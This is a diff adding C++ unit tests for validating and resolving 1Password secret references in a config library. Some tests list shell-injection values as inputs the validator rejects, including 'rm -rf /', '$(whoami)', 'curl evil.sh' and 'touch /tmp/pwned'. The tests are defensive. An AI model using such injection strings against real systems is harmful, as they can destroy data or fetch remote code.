@@ -1,3 +1,4 @@
+#include <raikiri/config/one_password.hpp>
 #include <raikiri/config/secret.hpp>
 
 #include <gtest/gtest.h>
@@ -159,6 +160,86 @@ TEST(SecretRef, EveryOtherSchemeIsNotPlaintext) {
         ASSERT_TRUE(ref.has_value()) << spec;
         EXPECT_FALSE(is_plaintext(ref->scheme)) << spec;
     }
+}
+
+// --- 1Password -------------------------------------------------------------
+
+TEST(OnePassword, ReferencesAreValidatedBeforeAnyProcessIsSpawned) {
+    EXPECT_TRUE(is_valid_op_reference("trading/binance/api-key"));
+    EXPECT_TRUE(is_valid_op_reference("op://trading/binance/api-key"));
+    // A section between item and field is legal.
+    EXPECT_TRUE(is_valid_op_reference("trading/binance/creds/api-key"));
+
+    // Wrong shape: op needs vault/item/field.
+    EXPECT_FALSE(is_valid_op_reference("trading/binance"));
+    EXPECT_FALSE(is_valid_op_reference("a/b/c/d/e"));
+    EXPECT_FALSE(is_valid_op_reference(""));
+    EXPECT_FALSE(is_valid_op_reference("trading//api-key"));
+    EXPECT_FALSE(is_valid_op_reference("/trading/binance/key"));
+}
+
+TEST(OnePassword, ShellMetacharactersAreRefused) {
+    // The reference reaches a shell. A config that names a vault is one thing;
+    // a config that runs a command is another, and the difference is this
+    // check — not the reader's good intentions.
+    for (const auto* evil : {"trading/binance/key; rm -rf /",
+                             "trading/$(whoami)/key",
+                             "trading/`id`/key",
+                             "trading/binance/key && curl evil.sh",
+                             "trading/bin ance/key"}) {
+        EXPECT_FALSE(is_valid_op_reference(evil)) << evil;
+    }
+}
+
+TEST(SecretRef, OnePasswordSchemeParses) {
+    const auto ref = SecretRef::parse("op:trading/binance/api-key");
+    ASSERT_TRUE(ref.has_value());
+    EXPECT_EQ(ref->scheme, SecretRef::Scheme::OnePassword);
+    EXPECT_EQ(ref->payload, "trading/binance/api-key");
+    EXPECT_EQ(to_string(ref->scheme), "1password");
+    // It names a location, so it is not plaintext.
+    EXPECT_FALSE(is_plaintext(ref->scheme));
+}
+
+TEST(OnePassword, ProbeReportsWhyRatherThanJustFailing) {
+    // The probe reads no secret, so it is safe to run anywhere — including a
+    // box with no 1Password at all, which is the case this asserts.
+    const auto status = probe_one_password();
+    if (!status.installed) {
+        EXPECT_FALSE(status.diagnostic.empty()) << "an unusable state must say why";
+        EXPECT_FALSE(status.usable());
+        return;
+    }
+    EXPECT_FALSE(status.version.empty());
+    // Authenticated or not, the mode is always nameable: that is what makes a
+    // server which silently fell back to a stale developer session visible.
+    EXPECT_FALSE(to_string(status.auth).empty());
+    if (!status.usable()) {
+        EXPECT_FALSE(status.diagnostic.empty());
+    }
+}
+
+TEST(OnePassword, AnUnauthenticatedManagerIsNotAFailedRead) {
+    // Distinct causes need distinct answers: absent credentials are not fixed
+    // by retrying or by correcting the path.
+    OpStatus status{};
+    status.installed = true;
+    status.auth = OpAuth::None;
+    Secret secret;
+    const auto result = resolve_one_password("trading/binance/api-key", status, secret);
+    ASSERT_FALSE(result.has_value());
+    EXPECT_EQ(result.error(), SecretError::NotAuthenticated);
+    EXPECT_TRUE(secret.empty());
+}
+
+TEST(OnePassword, AMalformedReferenceNeverReachesTheShell) {
+    OpStatus status{};
+    status.installed = true;
+    status.auth = OpAuth::ServiceAccount;
+    Secret secret;
+    const auto result = resolve_one_password("trading/x; touch /tmp/pwned", status, secret);
+    ASSERT_FALSE(result.has_value());
+    EXPECT_EQ(result.error(), SecretError::BadReference);
 }
 
 } // namespace
